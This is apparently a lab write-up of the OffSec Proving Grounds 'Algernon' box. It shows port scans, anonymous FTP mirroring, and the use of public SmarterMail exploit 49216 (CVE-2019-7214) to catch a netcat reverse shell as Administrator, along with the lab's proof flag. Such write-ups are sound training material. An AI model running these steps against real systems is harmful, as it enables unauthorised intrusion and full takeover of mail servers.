---
title: "Algernon (OffSec PG) — Walkthrough: SmarterMail Build 6985 RCE to Instant Admin"
description: "OffSec Proving Grounds Algernon walkthrough — exploiting SmarterMail Build 6985 .NET deserialization RCE (CVE-2019-7214) on a Windows host for an instant Administrator shell."
date: 2026-08-14 09:00:00 +0000
categories: [CTF]
tags: [ctf, offsec, proving-grounds, windows, rce, smartermail, cve-2019-7214, dotnet, deserialization]
difficulty: Easy
---

> **Box:** OffSec Proving Grounds — Algernon · **OS:** Windows · **Theme:** SmarterMail RCE → instant Administrator

Windows box. Rooted it through the **SmarterMail Build 6985 RCE** (CVE-2019-7214) on port `9998` — lands straight as Administrator, no privesc needed. Anonymous FTP and the pile of mail logs were a rabbit hole.

- **Box:** `192.168.152.65`
- **Me:** `192.168.45.170`

---

## Recon

rustscan into nmap. Lots of ports, clearly Windows:

```bash
┌──(kali㉿kali)-[~/Desktop/Offsec/Algernon]
└─$ rustscan -a 192.168.152.65 -- -A
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.

Open 192.168.152.65:21
Open 192.168.152.65:80
Open 192.168.152.65:135
Open 192.168.152.65:139
Open 192.168.152.65:445
Open 192.168.152.65:5040
Open 192.168.152.65:7680
Open 192.168.152.65:9998
Open 192.168.152.65:17001
Open 192.168.152.65:49664-49669

PORT      STATE SERVICE       VERSION
21/tcp    open  ftp           Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 04-29-20  10:31PM       <DIR>          ImapRetrieval
| 08-09-26  12:26PM       <DIR>          Logs
| 04-29-20  10:31PM       <DIR>          PopRetrieval
|_04-29-20  10:32PM       <DIR>          Spool
|_ftp-syst: SYST: Windows_NT
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-title: IIS Windows
|_http-server-header: Microsoft-IIS/10.0
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
5040/tcp  open  unknown
7680/tcp  open  pando-pub?
9998/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_Requested resource was /interface/root
|_http-favicon: Unknown favicon MD5: 9D7294CAAB5C2DF4CD916F53653714D5
17001/tcp open  remoting      MS .NET Remoting services
49664-49669/tcp open msrpc   Microsoft Windows RPC

Running (JUST GUESSING): Microsoft Windows 10|2019|11 (98%)
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled but not required
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

The interesting stuff: anonymous-friendly **FTP (21)**, **IIS (80)**, a **SmarterMail** web interface on **9998** (the `/interface/root` redirect gives it away), **.NET Remoting on 17001**, plus the usual SMB/RPC. The mail server on 9998 is the way in.

---

## Enumeration

### FTP (21) — Anonymous

Anonymous login allowed, so I logged in and looked around:

```bash
┌──(kali㉿kali)-[~/Desktop/Offsec/Algernon]
└─$ ftp 192.168.152.65
Connected to 192.168.152.65.
220 Microsoft FTP Service
Name (192.168.152.65:kali): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password:
230 User logged in.
Remote system type is Windows_NT.
ftp> ls
04-29-20  10:31PM       <DIR>          ImapRetrieval
08-09-26  12:26PM       <DIR>          Logs
04-29-20  10:31PM       <DIR>          PopRetrieval
04-29-20  10:32PM       <DIR>          Spool
226 Transfer complete.
ftp> get ImapRetrieval
local: ImapRetrieval remote: ImapRetrieval
550 Access is denied.
ftp>
```

Four directories (`ImapRetrieval`, `Logs`, `PopRetrieval`, `Spool`). Couldn't pull them with `get`/`mget` (access denied), so mirrored the whole share with wget:

```bash
┌──(kali㉿kali)-[~/Desktop/Offsec/Algernon]
└─$ wget -m --no-passive ftp://anonymous:anonymous@192.168.152.65
...
==> RETR 2020.04.29-delivery.log ... done.
==> RETR 2020.04.29-smtpLog.log ... done.
[... mirrors every dated log file in /Logs ...]
FINISHED --2026-08-09 19:46:44--
Total wall clock time: 30s
Downloaded: 67 files, 25K in 12s (2.05 KB/s)
```

67 files, ~25K — all SmarterMail delivery/smtp/imap/xmpp logs. Nothing useful in them. **Rabbit hole.** The real path is the mail server itself.

### SmarterMail (9998)

The web interface on 9998 is SmarterMail. Straight to searchsploit:

```bash
┌──(kali㉿kali)-[~/Desktop/Offsec/Algernon]
└─$ searchsploit Smartermail
------------------------------------------------------------ ---------------------------------
 Exploit Title                                              |  Path
------------------------------------------------------------ ---------------------------------
SmarterMail 16 - Arbitrary File Upload                     | multiple/webapps/48580.py
SmarterMail Build 6985 - Remote Code Execution             | windows/remote/49216.py
SmarterMail < 7.2.3925 - LDAP Injection                    | asp/webapps/15189.txt
(... older XSS / DoS / traversal entries omitted ...)
------------------------------------------------------------ ---------------------------------
Shellcodes: No Results
Papers: No Results
```

**SmarterMail Build 6985 - Remote Code Execution** → `windows/remote/49216.py` (**CVE-2019-7214**). Copied it out:

```bash
┌──(kali㉿kali)-[~/Desktop/Offsec/Algernon]
└─$ searchsploit -m windows/remote/49216.py
  Exploit: SmarterMail Build 6985 - Remote Code Execution
      URL: https://www.exploit-db.com/exploits/49216
     Path: /usr/share/exploitdb/exploits/windows/remote/49216.py
    Codes: CVE-2019-7214
 Verified: False
Copied to: /home/kali/Desktop/Offsec/Algernon/49216.py
```

---

## Exploitation

CVE-2019-7214 is a .NET deserialization bug in SmarterMail's remoting service (port 17001). The exploit takes target IP and reverse-shell host/port as variables at the top of the script — set those, start a listener, fire it:

```bash
┌──(kali㉿kali)-[~/Desktop/Offsec/Algernon]
└─$ python3 49216.py

┌──(kali㉿kali)-[~/Desktop/Offsec/Algernon]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [192.168.45.170] from (UNKNOWN) [192.168.152.65] 49915

PS C:\Users\Administrator\Desktop> type proof.txt
83359086cc2f7e0e74ebb19a9fcb83c9
```

Shell came back as **Administrator** — the SmarterMail service runs privileged, so the RCE drops straight into an admin shell with `proof.txt` sitting right on the Desktop.

**proof.txt:** `83359086cc2f7e0e74ebb19a9fcb83c9`

---

## TL;DR

- rustscan/nmap → Windows host with SmarterMail on 9998 (plus IIS 80, anon FTP 21, .NET Remoting 17001)
- Anonymous FTP + mail logs = rabbit hole
- **SmarterMail Build 6985 RCE** (CVE-2019-7214, EDB `49216`) — .NET deserialization via remoting service
- Service runs as Administrator → instant admin shell, `proof.txt` on the Desktop
